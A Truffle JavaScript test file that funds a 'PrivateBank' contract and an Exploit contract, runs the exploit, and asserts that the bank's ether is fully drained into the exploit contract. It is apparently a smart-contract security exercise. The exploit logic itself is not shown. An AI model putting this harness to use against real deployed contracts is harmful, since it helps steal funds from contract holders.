let Exploit = artifacts.require('./Exploit.sol');
let PrivateBank = artifacts.require('./PrivateBankI.sol');

contract('Exploit', (accounts) => {
  let exploit;
  let targetAddress;

  before('get deployed instance', async () => {
    exploit = await Exploit.deployed();
  });

  before('get bank instance', async () => {
    // we get this from the exploit contract because we don't deploy it in
    // forked mode. Alternatively we could hand-edit the contract artifact for
    // forked mode, but that's pretty lame.
    targetAddress = await exploit._targetAddress.call();
    target = await PrivateBank.at(targetAddress);
  });

  before('fund bank instance', async () => {
    await web3.eth.sendTransaction({
      from: accounts[0],
      to: targetAddress,
      value: web3.utils.toBN('1000000000000000000')
    });
  });

  before('fund exploit instance', async () => {
    const initialExploitBalance = await exploit.getBalance();
    if (initialExploitBalance.toString(10) == '0') {
      await web3.eth.sendTransaction({
        from: accounts[0],
        to: exploit.address,
        value: web3.utils.toBN('1000000000000000000')
      });
    }
  });

  it('should exploit the private_bank contract', async () => {
    let initialTargetBalance = await web3.eth.getBalance(targetAddress);
    let initialExploitBalance = await exploit.getBalance();


    console.log(`initial target contract balance: ${initialTargetBalance}`);
    console.log(`initial exploit contract balance: ${initialExploitBalance}`);


    assert.deepEqual(initialTargetBalance.toString(10), '1000000000000000000', 'Exploit initial balance incorrect. You may need to remigrate with `--reset` for things to work correctly.');

    assert.deepEqual(initialExploitBalance.toString(10), '1000000000000000000', 'Exploit initial balance incorrect. You may need to remigrate with `--reset` for things to work correctly.');

    try {
      let receipt = await exploit.tryIt();
      // console.log(receipt);
    } catch (err) {
      console.log(`Error occured: ${err.message}`);
    }

    let finalTargetBalance = await web3.eth.getBalance(targetAddress);
    let finalExploitBalance = await exploit.getBalance();

    console.log(`final target contract balance: ${finalTargetBalance}`);
    console.log(`final exploit contract balance: ${finalExploitBalance}`);

    assert.deepEqual(finalTargetBalance.toString(10), '0');
    assert.deepEqual(finalExploitBalance.toString(10), '2000000000000000000');
  });

});
